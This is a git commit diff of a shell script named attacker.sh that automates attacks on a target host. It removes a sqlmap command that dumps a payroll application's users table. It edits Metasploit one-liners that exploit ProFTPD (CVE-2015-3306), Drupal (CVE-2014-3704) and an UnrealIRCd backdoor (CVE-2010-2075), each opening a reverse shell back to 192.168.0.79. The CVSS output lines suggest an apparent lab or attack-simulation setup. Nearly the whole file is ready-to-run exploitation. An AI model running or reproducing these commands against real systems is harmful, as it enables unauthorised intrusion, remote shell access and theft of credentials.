e0de1e7eae31d87641b1c159b5628f736637a608
root <root@localhost.localdomain>
2020-04-19 20:11:27 +0000

    add

--- attacker.sh
+++ attacker.sh
@@ -4,13 +4,9 @@ ATTACK=$1
 TARGET=$2
 
 
-if [ $ATTACK == "1" ]
-then 
-	sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --dump 
-	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/
-elif [ $ATTACK == "CVE-2015-3306" ]
+if [ $ATTACK == "CVE-2015-3306" ]
 then
-	msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set rhost $TARGET; set sitepath /var/www/html; set exploit cmd/unix/reverse_perl; run; sessions -i 1 -c ./command_shell.sh; exit -y; " 
+	msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set rhost $TARGET; set sitepath /var/www/html; set exploit cmd/unix/reverse_perl; run; sessions -i 1 -s command_shell.sh; exit -y; " 
 	# in command shell run command background and then enter y
 	SERVER=$(cat results.txt | cut -d'/' -f 5 | cut -d'.' -f 2)
 	rm results.txt
@@ -21,7 +17,7 @@ then
 	echo "exploitabilityScore_V2: 10"
 elif [ $ATTACK == "CVE-2014-3704" ]
 then 
-	msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; set rhost $TARGET; set targeturi /drupal/; set payload php/reverse_perl; set lhost 192.168.0.79; exploit; sessions -i 1 -c ./command_shell.sh; exit -y"
+	msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; set rhost $TARGET; set targeturi /drupal/; set payload php/reverse_perl; set lhost 192.168.0.79; exploit; sessions -i 1 -s command_shell.sh; "
 	# in command shell run command background and then enter y
         SERVER=$(cat results.txt | cut -d'/' -f 5 | cut -d'.' -f 2)
         rm results.txt
@@ -32,7 +28,7 @@ then
 	echo "exploitabilityScore_V2: 10"
 elif [ $ATTACK == "CVE-2010-2075" ]
 then 
-	msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set rhost $TARGET; set rport 6697; set lhost 192.168.0.79; set payload cmd/unix/reverse_ruby; run; sessions -i 1 -c ./command_shell.sh; exit -y;"
+	msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set rhost $TARGET; set rport 6697; set lhost 192.168.0.79; set payload cmd/unix/reverse_ruby; run; sessions -i 1 -s command_shell.sh; exit -y;"
 	# in command shell run command background and then enter y
         SERVER=$(cat results.txt | cut -d'/' -f 5 | cut -d'.' -f 2)
         rm results.txt
@@ -42,5 +38,5 @@ then
 	echo "severity_V2: HIGH"
 	echo "exploitabilityScore_V2: 10"
 else
-	echo "Not valid. Enter either 1 or 2"
+	echo "Not valid."
 fi
